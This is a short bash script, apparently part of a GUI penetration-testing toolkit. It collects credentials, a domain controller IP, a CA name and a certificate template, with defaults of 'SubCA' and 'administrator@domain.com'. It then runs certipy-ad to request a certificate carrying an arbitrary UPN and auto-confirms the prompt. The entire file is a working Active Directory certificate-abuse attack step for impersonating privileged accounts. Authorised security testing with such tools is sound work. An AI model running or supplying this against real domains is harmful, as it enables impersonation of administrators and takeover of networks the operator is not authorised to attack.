#!/bin/bash

: '
request certificate according to template
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
DOMAIN_FIELD=$(form_item "domain" "domain")
USERNAME_FIELD=$(form_item "username" "username")
PASSWORD_FIELD=$(form_item "password" "password")
IP_FIELD=$(form_item "ip" "ip")
CA_NAME_FIELD=$(form_item "CA name" "ca_name")
TEMPLATE_FIELD=$(form_item "template name" "template" "SubCA")
UPN_FIELD=$(form_item "upn user" "upn_user" "administrator@domain.com")

# Generate GUI form
generate_form "${DOMAIN_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}" "${IP_FIELD}" "${CA_NAME_FIELD}" "${TEMPLATE_FIELD}" "${UPN_FIELD}"

DOMAIN=${form_data["domain"]}
USERNAME=${form_data["username"]}
PASSWORD=${form_data["password"]}
IP=${form_data["ip"]}
CA_NAME=${form_data["ca_name"]}
TEMPLATE=${form_data["template"]}
UPN=${form_data["upn_user"]}

execute_command "certipy-ad req -u ${USERNAME}@${DOMAIN} -p '${PASSWORD}' -dc-ip ${IP} -ca ${CA_NAME} -template ${TEMPLATE} -upn ${UPN}"
create_new_line
sleep 1

execute_command "y"
create_new_line
